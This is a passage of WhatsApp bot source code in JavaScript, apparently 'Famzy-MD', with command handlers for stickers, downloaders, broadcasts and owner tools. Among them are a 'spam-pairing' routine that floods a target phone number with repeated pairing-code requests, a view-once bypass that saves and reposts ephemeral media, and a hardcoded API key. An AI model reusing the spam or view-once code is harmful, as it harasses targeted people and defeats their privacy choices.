                reply(`${m.pushName} *ʜᴀꜱ ɢᴏɴᴇ ᴀꜰᴋ*${text ? ': ' + text : ''}`)
}

            break
case 'request': case 'reportbug': {
    pengguna()
	if (!text) return reply(`Example : ${
        prefix + command
      } ʜᴇʏ ꜰᴀᴍᴢʏ ᴘʟᴀʏ ᴄᴏᴍᴍᴀɴᴅ ɪꜱ ɴᴏᴛ ᴡᴏʀᴋɪɴɢ`)
            textt = `*| REQUEST/BUG |*`
            teks1 = `\n\n*User* : @${
   m.sender.split("@")[0]
  }\n*Request/Bug* : ${text}`
            teks2 = `\n\n*ʜᴇʏ ${m.pushName},ʏᴏᴜ ʀᴇQᴜᴇꜱᴛ ʜᴀꜱ ʙᴇᴇɴ ꜰᴏʀᴡᴀʀᴅᴇᴅ ᴛᴏ ᴍʏ ꜰᴀᴍᴢʏʟᴇᴇ*.\n*ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ...*`
            for (let i of owner) {
               client.sendMessage(i + "@s.whatsapp.net", {
                    text: textt + teks1,
                    mentions: [m.sender],
                }, {
                    quoted: m,
                })
            }
            client.sendMessage(m.chat, {
                text: textt + teks2 + teks1,
                mentions: [m.sender],
            }, {
                quoted: m,
            })

        }
break        
case "joingc": case "join": {
if (!Creator) return reply(mess.owner)
if (!text && !m.quoted) return reply(`*ᴇxᴀᴍᴘʟᴇ:* ${prefix + command} ᴜʀʟ ʟɪɴᴋ ɢʀᴏᴜᴘ`)
let teks = m.quoted ? m.quoted.text : text
if (!teks.includes('whatsapp.com')) return reply("ɪɴᴠᴀʟɪᴅ ʟɪɴᴋ!")
let result = teks.split('https://chat.whatsapp.com/')[1]
await client.groupAcceptInvite(result).then(respon => reply("* ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴇɴᴛᴇʀᴇᴅ ɪɴᴛᴏ ɢʀᴏᴜᴘ ᴄʜᴀᴛ")).catch(error => reply(error.toString()))
}
break  
case 'customsn': {
if (!Creator) return reply(`ꜱᴘᴇᴄɪᴀʟ ꜰᴏʀ ꜰᴀᴍᴢʏ-ᴍᴅ`)
if (!text) return reply(`example : .customsn +234**|famzy`)
let t = text.split('|')
let nomor = t[0]
let serial = t[1]
let oo = `${nomor}@s.whatsapp.net`
global.db.data.users[oo].sn = serial
return reply(`ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴄʜᴀɴɢᴇᴅ ᴛᴏ ${serial}`)
}
break
case 'restart':
if (!Creator) return reply(mess.owner)
await m.reply('*_ʀᴇꜱᴛᴀʀᴛɪɴɢ ʙᴏᴛ ɪɴ ᴘʀᴏᴄᴇꜱꜱɪɴɢ ꜱɪʀ...._*')
process.exit()
break
case 'obfus': case 'enc': case 'obfuscate':{
if (!text) return reply(`ᴇxᴀᴍᴘʟᴇ ${prefix+command} const xeonbot = require('baileys')`)
let meg = await obfus(text)
reply(`ꜱᴜᴄᴄᴇꜱꜱ
${meg.result}`)
}
break        
case 'database': {
if (!Creator) return reply(mess.owner)
totalregg = Object.keys(global.db.data.users).length
    let rtotalreg = Object.values(global.db.data.users).filter(user => user.registered == true).length
    reply(`*${totalregg} ᴜꜱᴇʀꜱ ᴜꜱɪɴɢ ʙᴏᴛ*`)
}
break 
case "listhadiah": case "listgifts": {
if (!Creator) return reply(mess.owner)
if (db.data.settings.hadiah.length < 1) return reply("ᴛʜᴇʀᴇ ɪꜱ ɴᴏ ɢɪꜰᴛ ᴄᴏᴅᴇ")
var teks = `*乂 LIST CODE PRESENT*\n\nTᴏᴛᴀʟ : *${db.data.settings.hadiah.length}*\n\nᴛʏᴘᴇ .ʀᴇᴅᴇᴇᴍᴄᴏᴅᴇ <ᴄᴏᴅᴇ> ꜰᴏʀ ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇ`
db.data.settings.hadiah.forEach((e) => {
teks += ` ◦ ${e}\n`
})
reply(teks)
}
break
case "buathadiah": case "makeagift": {
if (!Creator) return reply(mess.owner)
if (isNaN(args[0])) return reply('ɴᴜᴍʙᴇʀ ᴏꜰ ɢɪꜰᴛ ᴄᴏᴅᴇꜱ')
for (let i = 0; i < Number(args[0]); i++) {
db.data.settings.hadiah.push(crypto.randomBytes(4).toString("hex"))
}
let teks = '\n'
db.data.settings.hadiah.forEach((e) => {
teks += `◦ ${e}\n`
})
reply(teks)
}
break
case 'clearsession': {
                if (!Creator) return reply(mess.owner)
                fs.readdir("./session", async function(err, files) {
                    if (err) {
                        console.log('ᴜɴᴀʙʟᴇ ᴛᴏ ꜱᴄᴀɴ ᴅɪʀᴇᴄᴛᴏʀʏ: ' + err);
                        return reply('ᴜɴᴀʙʟᴇ ᴛᴏ ꜱᴄᴀɴ ᴅɪʀᴇᴄᴛᴏʀʏ: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Detected ${filteredArray.length} junk files\n\n`
                    if (filteredArray.length == 0) return reply(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    reply(teks)
                    await sleep(2000)
                    reply("ᴅᴇʟᴇᴛɪɴᴅ ᴊᴜɴᴋ ꜰɪʟᴇꜱ...")
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./session/${file}`)
                    });
                    await sleep(2000)
                    reply("ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴅᴇʟᴇᴛᴇᴅ ᴀʟʟ ᴛʜᴇ ᴛʀᴀꜱʜ ɪɴ ᴛʜᴇ ꜱᴇꜱꜱɪᴏɴ ꜰᴏʟᴅᴇʀ")
                });
            }
            break
case 'bcgc': case 'bcgroup': {
if (!Creator) return reply(mess.owner)
if (!text) return reply(`ᴡʜɪᴄʜ ᴛᴇxᴛ?\n\nᴇxᴀᴍᴘʟᴇ : ${prefix + command} fatih-san`)
let getGroups = await client.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
reply(`ꜱᴇɴᴅ ʙʀᴏᴀᴅᴄᴀꜱᴛ ᴛᴏ ${anu.length} ɢʀᴏᴜᴘ ᴄʜᴀᴛ, ꜰɪɴɪꜱʜ ᴛɪᴍᴇ ${anu.length * 1.5} ꜱᴇᴄᴏɴᴅ`)
for (let i of anu) {
await sleep(1500)
client.sendMessage(i, {text: `${text}`}, {quoted:rissxdsaluran})
}
reply(`ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴅɪɴɢ ʙʀᴏᴀᴅᴄᴀꜱᴛɪɴɢ ᴛᴏ ${anu.length} ɢʀᴏᴜᴘꜱ`)
}
break
case "backup":{
if (!Creator) return reply(mess.owner);
const { execSync } = require("child_process");
const ls = (await execSync("ls")).toString().split("\n").filter(
  (pe) =>
pe != "node_modules" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != "tmp" &&
pe != ""
);
const exec = await execSync(`zip -r backup.zip ${ls.join(" ")}`);
await client.sendMessage(m.chat, { document: await fs.readFileSync("./backup.zip"), mimetype: "application/zip", fileName: "backup.zip",},{quoted: m}); await execSync("rm -rf backup.zip");
}
break        
case 'public': {
if (!Creator) return reply(`ꜰᴀᴍᴢʏ ᴏɴʟʏ, ꜱᴏʀʀʏ ꜰᴏʀ ᴛʜᴇ ᴇᴍʙᴀʀʀᴀꜱꜱᴍᴇɴᴛ`)
client.public = true
reply('*ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴛᴜʀɴꜱ ᴛᴏ ᴘᴜʙʟɪᴄ-ᴜꜱᴇ*')
            }
            break
            case 'self': case 'me-mode': {
if (!Creator) return reply(`ꜰᴀᴍᴢʏ ᴏɴʟʏ, ꜱᴏʀʀʏ ꜰᴏʀ ᴛʜᴇ ᴇᴍʙᴀʀʀᴀꜱꜱᴍᴇɴᴛ`)
client.public = false
reply('*ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴛᴜʀɴꜱ ɪɴᴛᴏ ꜰᴀᴍᴢʏ-ᴏɴʟʏ-ᴍᴏᴅᴇ*')
            }
            break
case 'spam-pairing': case 'spampairing': {
if (!Creator) return reply(mess.owner)
if (!text) return reply(`*ᴇxᴀᴍᴘʟᴇ:* ${prefix + command} +234xxxxxx|150`)
reply(mess.wait)
let [peenis, pepekk = "200"] = text.split("|")

let target = peenis.replace(/[^0-9]/g, '').trim()
let { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys')
let { state } = await useMultiFileAuthState('pepek')
let { version } = await fetchLatestBaileysVersion()
let pino = require("pino")
let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) })

for (let i = 0; i < pepekk; i++) {
await sleep(1500)
let prc = await sucked.requestPairingCode(target)
await console.log(`ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴘᴀᴍ ᴘᴀɪʀɪɴɢ ᴄᴏᴅᴇ - ɴᴜᴍʙᴇʀ : ${target} - ᴄᴏᴅᴇ : ${prc}_`)
}
await sleep(15000)
}
break
case 'addlimit': {
                if (!Creator) return reply(`ᴇꜱᴘᴇᴄɪᴀʟʟʏ ꜰᴏʀ ꜰᴀᴍᴢʏ, ꜱɪꜱ`)
                if (!text) return reply(`ᴜꜱᴀɢᴇ ${prefix + command} ɴᴜᴍʙᴇʀ|ʟɪᴍɪᴛ ᴀᴍᴏᴜɴᴛ`)
                let usernya = text.split('|')[0]
                let limitnya = text.split('|')[1]
                let oo = `${usernya}@s.whatsapp.net`
                global.db.data.users[oo].limit += parseInt(limitnya)
                reply(`done`)
}
break        
case 'rvo':
case 'vv':
case 'readviewonce': {
	pengguna()
	if (users.limit < 10) return reply(`[ ! ] YOUR LIMIT IS LESS THAN 10`)
    uselimit(10)
	if (!m.quoted) return reply(`ʀᴇᴘʟʏ ᴛᴏ ᴠɪᴇᴡᴏɴᴄᴇ ᴍᴇꜱꜱᴀɢᴇꜱ<`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return reply(`ᴛʜɪꜱ ɪꜱ ɴᴏᴛ ᴀ ᴠɪᴇᴡ ᴏɴᴄᴇ ᴍᴇꜱꜱᴀɢᴇ`)
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return client.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return client.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
    }
}
break        
case 'smeme': case 'meme': {
    pengguna()
    let [atas, bawah] = text.split`|`
    let q = m.quoted ? m.quoted : m
    let mime = (q.msg || q).mimetype || ''
    if (!mime) return reply(`ʀᴇᴘʟʏ ɪᴍᴀɢᴇ ᴡɪᴛʜ ᴄᴏᴍᴍᴀɴᴅ\n\n${prefix + command} <${atas ? atas : 'ᴛᴏᴘ ᴛᴇxᴛ'}>|<${bawah ? bawah : 'bottom text'}>`)
    reply(global.mess.wait)
    if (!/image\/(jpe?g|png)/.test(mime)) return reply(`_*Mime ${mime} tidak didukung!*_`)
    let img = await q.download()
    let url = await uploadImage(img)
    let meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas ? atas : '')}/${encodeURIComponent(bawah ? bawah : '')}.png?background=${url}`
    client.sendImageAsSticker(m.chat, meme, qsticker, { packname: packname, author: author })

}
break 
case 'sticker': case 's': case 'stickergif': case 'sgif': {
pengguna()
 if (!quoted) return reply(`ʀᴇᴘʟʏ ᴛᴏ ᴠɪᴅᴇᴏ/ɪᴍᴀɢᴇ ᴡɪᴛʜ ᴄᴀᴘᴛɪᴏɴ${prefix + command}`)
if (/image/.test(mime)) {
reply(`RᴇQᴜᴇꜱᴛ ɪɴ Pʀᴏᴄᴄᴇꜱꜱɪɴɢ...`)
let media = await quoted.download()
let encmedia = await client.sendImageAsSticker(from, media, qsticker, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('ᴍᴀxɪᴍᴜᴍ 10 ꜱᴇᴄᴏɴᴅꜱ!')
let media = await quoted.download()
let encmedia = await client.sendVideoAsSticker(from, media, qsticker, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
return reply(`ꜱᴇɴᴅ ɪᴍᴀɢᴇ/ᴠɪᴅᴇᴏ ᴡɪᴛʜ ᴄᴀᴘᴛɪᴏɴ ${prefix + command}\nDᴠɪᴅᴇᴏ ᴅᴜʀᴀᴛɪᴏɴ 1-9 ꜱᴇᴄᴏɴᴅꜱ`)
}
}
break   
case 'getidch': {
pengguna()
if (users.limit < 1) return reply(`[ ! ] YOUR LIMIT IS LESS THAN 1`)
if (!m.quoted) return m.reply('ʀᴇᴘʟʏ ᴛᴏ ᴛʜᴇ ᴄʜᴀɴɴᴇʟ')
try {
let id = (await m.getQuotedObj()).msg.contextInfo.forwardedNewsletterMessageInfo
await m.reply(`ɴᴀᴍᴇ: ${id.newsletterName}\nɪᴅ: ${id.newsletterJid}`)
} catch (e) {
m.reply('ʜᴀᴠᴇ ᴛᴏ ᴄʜᴀᴛ ꜰʀᴏᴍ ᴛʜᴇ ᴄʜᴀɴɴᴇʟ, ʙʀᴏ')
}
}
uselimit(1)
break        
case 'tourl': case 'tolink': {
 pengguna()
 if (users.limit < 1) return reply(`[ ! ] YOUR LIMIT IS LESS THAN 1`)
  uselimit(1)
  let q = m.quoted ? m.quoted : m
  let mime = (q.msg || q).mimetype || ''
  if (!mime) return reply('ɴᴏ ᴍᴇᴅɪᴀ ꜰᴏᴜɴᴅ')
  let media = await q.download()
  let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime)
  let fileSizeLimit = 5 * 1024 * 1024 
  if (media.length > fileSizeLimit) {
    return reply(`ᴍᴇᴅɪᴀ ꜱɪᴢᴇ ꜱʜᴏᴜʟᴅ ɴᴏᴛ ᴇxᴄᴇᴇᴅ 5ᴍᴅ`)
  }
  let link = await (isTele ? uploadImage : uploadFile)(media)
  replyy(`⛃ *𝙰𝙻𝙸𝙷𝙰𝙼𝙳𝚄𝙻𝙸𝙻𝙰𝙷, 𝙷𝙴 𝚆𝙾𝚁𝙺 𝙾𝙾𝙾𝙾* 😋

│ • ${link}

${media.length} Byte(s)
${isTele ? '(ɴᴏ ᴇxᴘɪʀᴀᴛɪᴏɴ ᴅᴀᴛᴇ)' : '(ᴇxᴘɪʀᴇᴅ 24 ʜᴏᴜʀꜱ)'}`)
}

			break
case 'yts': case 'ytsearch': {
pengguna()
if (users.limit < 1 ) return reply(`[ ! ] YOUR LIMIT IS LESS THAN 1`)
if (!text) return reply(`Example : ${prefix + command} story wa anime`)
let yts = require("yt-search")
let search = await yts(text)
let teks = 'ʏᴏᴜᴛᴜʙᴇ ꜱᴇᴀʀᴄʜ\n\n ʀᴇꜱᴜʟᴛꜱ ꜰʀᴏᴍ '+text+'\n\n'
let no = 1
for (let i of search.all) {
teks += `${themeemoji} ɴᴏ : ${no++}\n${themeemoji} ᴛʏᴘᴇ : ${i.type}\n${themeemoji} ᴠɪᴅᴇᴏ ɪᴅ : ${i.videoId}\n${themeemoji} Title : ${i.title}\n${themeemoji} ᴠɪᴇᴡꜱ : ${i.views}\n${themeemoji} ᴅᴜʀᴀᴛɪᴏɴ : ${i.timestamp}\n${themeemoji} ᴜᴘʟᴏᴀᴅᴇᴅ : ${i.ago}\n${themeemoji} ᴜʀʟ : ${i.url}\n\n─────────────────\n\n`
}
client.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: qpayment })
            }
  uselimit(1)
            break
case "play": {
pengguna()
if (users.limit < 1) return reply(`[ ! ] YOUR LIMIT IS LESS THAN 1`)
if (!text) return reply(`*ᴇxᴀᴍᴘʟᴇ:* ${prefix + command} photograph`)
await reaction(m.chat, "⏳");
const yts = require('yt-search');
let search = await yts(text);
let telaso = search.all[0].url;
var response = await ytdl(telaso)
var puki = response.data.mp3
client.sendMessage(m.chat, { audio: { url: puki },
mimetype: "audio/mpeg",
fileName: "kiuu.mp3",
contextInfo: {
forwardingScore: 100,
isForwarded: true,
externalAdReply: {
showAdAttribution: true,
title: search.all[0].title,
sourceUrl: search.all[0].timestamp,
thumbnailUrl: search.all[0].thumbnail,
}}},{quoted:m})
uselimit(1)
}
break

case 'tovn': {
if (!terdaftar) return reply(global.mess.daftar)
if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(`reply video/vn with caption ${prefix + command}`)
if (!quoted) return m.reply(`ʀᴇᴘʟʏ ᴠɪᴅᴇᴏ/ᴠɪᴏᴄᴇɴᴏᴛᴇ ᴡɪᴛʜ ᴄᴀᴘᴛɪᴏɴ ${prefix + command}`)
await reaction(m.chat, "🔒");
await sleep(5000)
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
await reaction(m.chat, "🔓");
client.sendMessage(m.chat, {audio, mimetype:'audio/mpeg', ptt: true}, { quoted : m })
}
break
case 'ytmp4': case 'ytvideo': case 'ytplayvideo': {
				if (!text) return reply(`Example: ${prefix + command} url_youtube`)
				if (!text.includes('youtu')) return reply('ᴛʜᴇ ʟɪɴᴋ ɪꜱ ɴᴏᴛ ᴀ ʏᴏᴜᴛᴜʙᴇ ʟɪɴᴋ!')
				const hasil = await ytMp4(text);
			   reaction(m.chat, "⌚")
				await client.sendMessage(m.chat, { video: { url: hasil.result }, caption: `*📍Title:* ${hasil.title}\n*✏Description:* ${hasil.desc ? hasil.desc : ''}\n*🚀Channel:* ${hasil.channel}\n*🗓Upload at:* ${hasil.uploadDate}` }, { quoted: m });
			}
			break
case 'mediafire': case 'mf': {
pengguna()
if (users.limit < 1) return reply(`[ ! ] YOUR LIMIT IS LESS THAN 1`)
if (!text.includes('mediafire.com')) return reply(`• *Example :* .${command} https://www.mediafire.com/file/xxxxxxx/`)

async function mf(url) {
    return new Promise(async (resolve, reject) => {
        try {
            const response = await require("undici").fetch(url);
            const data = await response.text();
            const $ = cheerio.load(data);
            
            let name = $('.dl-info > div > div.filename').text();
            let link = $('#downloadButton').attr('href');
          let det = $('ul.details').html().replace(/\s/g, "").replace(/<\/li><li>/g, '\n').replace(/<\/?li>|<\/?span>/g, '');
            let type = $('.dl-info > div > div.filetype').text();

        

            const hasil = {
                filename: name,
                filetype: type,
                link: link,
                detail: det
            };

            resolve(hasil);
        } catch (err) {
            console.error(err);
            reject(err);
        }
    });
}

const sendReaction = async reactionContent => {
  client.sendMessage(m.chat, {
    'react': {
      'text': reactionContent,
      'key': m.key
    }
  });
};

try {
let { filename, filetype, link, detail } = await mf(text)
let mfcap = `╭──── *[ ᴅᴏᴡɴʟᴏᴀᴅ - ᴍғ ]* ──々\n`
mfcap += `│ =〆 ɴᴀᴍᴇ : ${filename}\n`
mfcap += `│ =〆 ᴛʏᴘᴇ : ${filetype}\n`
mfcap += `│ =〆 ᴅᴇᴛᴀɪʟ : ${detail}\n`
mfcap += `│ =〆 ᴜʀʟ : ${text}\n`
mfcap += `╰─々`

await client.sendMessage(m.chat, {document: {url:link}, mimetype: link, fileName: filename, caption: mfcap }, {quoted:m});
} catch (err) {
try {
sendReaction("⏳")
const akira = await fetchJson(`https://api.botwa.space/api/mediafire?url=${text}&apikey=90x5sFRa1Xlc`)
let { filename, filesize, uploadAt, link } = akira.result
let result = `╭──── *[ ᴅᴏᴡɴʟᴏᴀᴅ - ᴍғ ]* ──々\n`
result += `│ =〆 ɴᴀᴍᴇ : ${filename}\n`
result += `│ =〆 sɪᴢᴇ : ${filesize}\n`
result += `│ =〆 ᴅᴀᴛᴇ ᴜᴘʟᴏᴀᴅ : ${uploadAt}\n`
result += `│ =〆 ᴜʀʟ : ${text}\n`
result += `╰─々`
sendReaction("✅")
await client.sendMessage(m.chat, {document: {url:akira.result.link}, mimetype: akira.result.link, fileName: filename, caption: result}, {quoted:m});
} catch (err) {
 sendReaction("❌")
}}}
uselimit(1)
break
case 'sfiledl': case 'sfdl': {
pengguna()
if (users.limit < 1) return reply(`[ ! ] YOUR LIMIT IS LESS THAN 1`) 
if (!text.includes('https://sfile.mobi')) return reply(`• *Example :* .${command} https://sfile.mobi/xxxxxxx/`)

reply(mess.wait)
reaction(m.sender, "⏳")
/*
💥 *SFILE DOWNLOADER*

💨 Options:
- Search (Query) + Page
- Top Trending + Page
- Latest Upload + Page
- Download

🧑‍💻 Script Code by Daffa
*/

const sfile = {
    latest_uploads: async function(page = 1) {
        try {
            const res = await axios.get('https://sfile.mobi');
            const cookies = res.headers['set-cookie'].map(cookie => cookie.split(';')[0]).join('; ');
            const headers = {
                'cookie': cookies,
                'referer': 'https://sfile.mobi/uploads.php',
                'user-agent': 'Postify/1.0.0'
            };
            const uploads = await axios.get(`https://sfile.mobi/uploads.php?page=${page}`, { headers });
            const $ = cheerio.load(uploads.data);

            const data = $('.list').map((_, el) => ({
                title: $(el).find('a').text().trim(),
                link: $(el).find('a').attr('href'),
                size: $(el).find('small').text().match(/(\d+(?:\.\d+)?\s[KMGT]B)/)?.[1],
                uploadDate: $(el).find('small').text().match(/Uploaded:\s([\d\-a-zA-Z]+)/)?.[1]
            })).get().filter(item => item.title && item.link && item.size && item.uploadDate);

            return { creator: 'Daffa ~', status: 'success', code: 200, data };
        } catch (error) {
            console.error(error);
            return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: 'Aɴ ᴇʀʀᴏʀ ᴏᴄᴄᴜʀʀᴇ ᴡʜɪʟᴇ ꜰᴇᴛᴄʜɪɴɢ ᴛʜᴇ ʟᴀᴛᴇꜱᴛ ᴜᴘᴅᴀᴛᴇꜱ.' };
        }
    },

    top_trending: async function(page = 1) {
        try {
            const response = await axios.get('https://sfile.mobi');
            const cookies = response.headers['set-cookie'].map(cookie => cookie.split(';')[0]).join('; ');
            const headers = {
                'authority': 'sfile.mobi',
                'accept': 'application/json, text/html, application/xhtml+xml, application/xml;q=0.9, image/avif, image/webp, image/apng, */*;q=0.8, application/signed-exchange;v=b3;q=0.7',
                'cookie': cookies,
                'referer': `https://sfile.mobi/top.php?page=${page}`,
                'user-agent': 'Postify/1.0.0'
            };
            const top = await axios.get(`https://sfile.mobi/top.php?page=${page}`, { headers });
            const $ = cheerio.load(top.data);

            const data = $('.list').map((_, el) => {
                const title = $(el).find('a').text().trim();
                const link = $(el).find('a').attr('href');
                const [size, downloadInfo] = $(el).find('small').text().split(', Download: ').map(e => e.trim());
                const [downloadCount, uploadedDate] = downloadInfo ? downloadInfo.split(' Uploaded: ').map(e => e.trim()) : [undefined, undefined];

                return title && link && size && downloadCount && uploadedDate ? 
                    { title, link, size, downloadCount, uploadDate: uploadedDate } : null;
            }).get().filter(item => item);

            return { creator: 'Daffa ~', status: 'success', code: 200, data };
        } catch (error) {
            console.error(error);
            return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: 'Aɴ ᴇʀʀᴏʀ ᴏᴄᴄᴜʀʀᴇ ᴡʜɪʟᴇ ꜰᴇᴛᴄʜɪɴɢ ᴛʜᴇ ᴛᴏᴘ ᴛʀᴇɴᴅɪɴɢ ꜰɪʟᴇ.' };
        }
    },
    
    search: async function(query, page = 1) {
        try {
            const url = `https://sfile.mobi/search.php?q=${query}&page=${page}`;
            const response = await axios.get(url, {
                headers: {
                    'authority': 'sfile.mobi',
                    'accept': 'application/json, text/html, application/xhtml+xml, application/xml;q=0.9,*/*;q=0.8',
                    'referer': url,
                    'user-agent': 'Postify/1.0.0'
                }
            });

            const $ = cheerio.load(response.data);
            
            const data = $('.list').map((_, el) => {
                const title = $(el).find('a').text().trim();
                const link = $(el).find('a').attr('href');
                const sizeMatch = $(el).text().match(/\(([^)]+)\)$/);
                const size = sizeMatch ? sizeMatch[1] : undefined;
                return title ? { title, link, size } : null;
            }).get();

            return { creator: 'Daffa ~', status: 'success', code: 200, data };
        } catch (error) {
            console.error(error);
            return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: 'Aɴ ᴇʀʀᴏʀ ᴏᴄᴄᴜʀʀᴇ ᴡʜɪʟᴇ ꜰᴇᴛᴄʜɪɴɢ ꜱᴇᴀʀᴄʜ ʀᴇꜱᴜʟᴛꜱ.' };
        }
    },
    
    download: async function(url) {
        const headers = {
            'referer': url,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'user-Agent': 'Postify/1.0.0',
        };

        try {
            const response = await axios.get(url, { headers });
            headers.Cookie = response.headers['set-cookie'].map(cookie => cookie.split(';')[0]).join('; ');

            const [filename, mimetype, downloadLink] = [
                response.data.match(/<h1 class="intro">(.*?)<\/h1>/s)?.[1] || '',
                response.data.match(/<div class="list">.*? - (.*?)<\/div>/)?.[1] || '',
                response.data.match(/<a class="w3-button w3-blue w3-round" id="download" href="([^"]+)"/)?.[1]
            ];
            
            if (!downloadLink) return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: 'Dɪʀᴇᴄᴛ Doᴡɴʟᴏᴀᴅ Lɪɴᴋ ɴᴏᴛ ꜰᴏᴜɴᴅ!' };

            headers.Referer = downloadLink;
            const final = await axios.get(downloadLink, { headers });

            const [directLink, key, filesize] = [
                final.data.match(/<a class="w3-button w3-blue w3-round" id="download" href="([^"]+)"/)?.[1],
                final.data.match(/&k='\+(.*?)';/)?.[1].replace(`'`, ''),
                final.data.match(/Download File \((.*?)\)/)?.[1]
            ];

            const result = directLink + (key ? `&k=${key}` : '');
            if (!result) return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: 'Dɪʀᴇᴄᴛ Doᴡɴʟᴏᴀᴅ Lɪɴᴋ ɴᴏᴛ ꜰᴏᴜɴᴅ!' };

            const data = await this.convert(result, url);

            return { creator: 'Daffa ~', status: 'success', code: 200, data: { filename, filesize, mimetype, result: data } };
        } catch (error) {
            return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: error };
        }
    },

    convert: async function(url, directLink) {
        try {
            const init = await axios.get(url, {
                maxRedirects: 0,
                validateStatus: status => status >= 200 && status < 303,
                headers: {
                    'Referer': directLink,
                    'User-Agent': 'Postify/1.0.0'
                },
            });

            const cookies = init.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
            const redirect = init.headers.location;

            const final_result = await axios.get(redirect, {
                responseType: 'arraybuffer',
                headers: {
                    'referer': directLink,
                    'user-agent': 'Postify/1.0.0',
                    'cookie': cookies,
                },
            });

            const filename = final_result.headers['content-disposition']?.match(/filename=["']?([^"';]+)["']?/)?.[1] || 'Unknown';
            return {
                filename,
                mimeType: final_result.headers['content-type'],
                buffer: Buffer.from(final_result.data)
            };
        } catch (error) {
            throw error;
        }
    }
};

try {
let hasil = await sfile.download(text)
let { filename, filesize, mimetype } = hasil.data
let sfdl = hasil.data.result
let sfcap = `╭──── *[ ᴅᴏᴡɴʟᴏᴀᴅ - sғ ]* ──々\n`
sfcap += `│ =〆 ɴᴀᴍᴇ : ${filename}\n`
sfcap += `│ =〆 ᴛʏᴘᴇ : ${mimetype}\n`
sfcap += `│ =〆 ᴅᴇᴛᴀɪʟ : ${filesize}\n`
sfcap += `│ =〆 ᴜʀʟ : ${text}\n`
sfcap += `╰─々`

await client.sendMessage(m.chat, {document: sfdl.buffer, mimetype: sfdl.mimeType, fileName: sfdl.filename, caption: sfcap }, {quoted:m});
reaction(m.sender, "✅")
} catch (err) {
reaction(m.sender, "❌")
}uselimit(1)}
break
case 'gdrive': {
    pengguna()
		if (!args[0]) return reply(`ᴇɴᴛᴇʀ ᴛʜᴇ ɢᴏᴏɢʟᴇ ᴅʀɪᴠᴇ ʟɪɴᴋ`)
	reply(mess.wait)
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await reply(`
≡ *Gᴏᴏɢʟᴇ Dʀɪᴠᴇ Dʟ*
▢ *Nᴀᴍᴇ:* ${res.fileName}
▢ *Sɪᴢᴇ:* ${res.fileSize}
▢ *Tʏᴘᴇ:* ${res.mimetype}`)
	client.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch {
	reply('ᴇʀʀᴏʀ: ᴄʜᴇᴄᴋ ʟɪɴᴋ ᴏʀ ᴛʀʏ ᴀɴᴏᴛʜᴇʀ ʟɪɴᴋ') 
  }
}
uselimit(1)
break
case 'ttslide': case 'tiktokslide': case 'ttslide':{
pengguna()
if (!text.includes('tiktok.com')) return reply(`*Example :* .${command} hhttps://vt.tiktok.com/xxxxxxx/`)
if (users.limit < 1) return reply(`[ ! ] YOUR LIMIT IS LESS THAN 1`)
const { tiktok, tiktok2, dlv3, dlv4, dlv5 } = require('./lib/tiktoktop')
const hasil = await dlv5(text)
let leocap = `*FAMZXD SLIDE DOWNLOADER*\n\n*TITLE* : ${hasil.title}\n\n *DATE* : ${hasil.at}\n\n*LINK* : ${text}`

try {
reaction(m.chat, "⏳")//react error
for (let i = 0; i < hasil.data.length; i++) {
let image = hasil.data[i];
await client.sendMessage(m.sender, { image: { url: image.url }, caption: i === 0 ? `${leocap}` : '' }, { quoted: m });
if (isGroup) return reply(`SLIDE PHOTO HAS BEEN SENT TO PRIVATE CHAT`)
reaction(m.chat, "✅")//react error
}
} catch (err) {
reaction(m.chat, "❎")//react error
}}
uselimit(1)
break
case 'tiktokvideo':
case 'ttvideo':
case 'tiktokvid':
case 'ttvid':
case 'tt': {
